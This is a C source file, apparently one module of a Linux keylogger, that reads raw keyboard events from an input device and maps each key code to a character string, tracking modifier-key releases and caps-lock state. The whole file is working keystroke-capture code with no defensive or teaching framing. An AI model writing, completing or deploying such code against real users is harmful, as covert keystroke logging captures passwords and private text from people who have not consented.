#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>


/*----------------------------------*/


// Variables
extern int g_verbose; //from keylogger.c
#define STR_MAX 128
#define N_KEY_CODES 83
char const * const KEY_CODES[] ={
    "RESERVED",
    "<ESC>",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "\b",
    "\t",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "[",
    "]",
    "\n",
    "LEFTCTRL",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    ";",
    "'",
    "`",
    "LEFTSHIFT",
    "\\",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    "/",
    "RIGHTSHIFT",
    "*",
    "LEFTALT",
    " ",
    "<CAPSLOCK>",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "<NUMLOCK>",
    "<SCROLLOCK>",
    "7",
    "8",
    "9",
    "-",
    "4",
    "5",
    "6",
    "+",
    "1",
    "2",
    "3",
    "0",
    ".",
};


char *KLG_readKbdDev( int fd ){
    static char retStr[STR_MAX];            //memory persistent buffer to hold return string in some cases
    memset(retStr, 0, sizeof( retStr ) );
    if( g_verbose )
        printf( "reading file fd %d\n", fd );
    ssize_t n;
    struct input_event event;

    n = read( fd, &event, sizeof( event ) );
    //reads key event. shifts, alts, and controls are treated special. capslock keys are treated special
    if( event.type == EV_KEY ){    
        if ( event.code < N_KEY_CODES && event.code != KEY_CAPSLOCK ){
            if( event.value == 1 ){                         //key pressed events
                if ( g_verbose )
                    printf( "%s keypress\n", KEY_CODES[event.code] );
                strncpy( retStr, KEY_CODES[event.code], sizeof( retStr ) );
                return retStr;
            }else if ( event.value == 0 ){                  // key released events
                if( event.code == KEY_LEFTSHIFT ||
                    event.code == KEY_RIGHTSHIFT ||
                    event.code == KEY_LEFTALT ||
                    event.code == KEY_LEFTCTRL)
                    {
                    if( g_verbose )
                        printf( "%s keyrelease", KEY_CODES[event.code] );
                    const char *PREFIX = "<REL";
                    const char *SUFFIX = ">";
                    int  len = strlen( PREFIX ) + strlen( KEY_CODES[event.code] ) + strlen( SUFFIX ) + 1; //+1 for '\0'
                    return strcat(strcat(strcat(retStr, PREFIX), KEY_CODES[event.code]),SUFFIX);
                }
            }
        }
    }
    if(event.type == EV_LED && event.code == LED_CAPSL){//LED event to deterine capslock.
        if(event.value == 1){
            return "CAPSLOCKON";
        }else if(event.value == 0){
            return "CAPSLOCKFF";
        }
    }
    return NULL;
}
